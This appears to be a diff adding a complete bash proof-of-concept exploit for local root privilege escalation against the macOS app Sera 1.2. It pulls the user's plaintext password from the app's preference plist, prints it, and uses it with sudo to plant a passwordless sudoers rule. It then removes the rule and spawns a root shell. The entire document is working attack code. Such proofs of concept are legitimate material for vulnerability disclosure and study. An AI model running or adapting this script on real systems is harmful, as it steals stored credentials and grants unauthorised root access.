@@ -1,0 +1,24 @@
+#!/bin/bash
+
+##############################################################
+###### sera 1.2 local root privilege escalation exploit ######
+###### by m4rkw - https://m4.rkw.io/blog.html           ######
+##############################################################
+
+sera_pass=`plutil -p ~/Library/Preferences/no.ignitum.SeraOSX.plist |grep '"sera_pass"' |cut -d '"' -f4`
+
+if [ "$sera_pass" == "" ] ; then
+  echo "Password not found."
+  exit 1
+fi
+
+echo "user's password is: $sera_pass"
+
+user="`whoami`"
+
+echo "$user ALL=(ALL) NOPASSWD:ALL" > /tmp/sera_12_exp
+
+echo "$sera_pass" | sudo -S chown root:wheel /tmp/sera_12_exp 1>/dev/null 2>/dev/null
+echo "$sera_pass" | sudo -S mv /tmp/sera_12_exp /etc/sudoers.d/sera_12_exp 1>/dev/null 2>/dev/null
+
+sudo bash -c 'rm -f /etc/sudoers.d/sera_12_exp; /bin/bash'
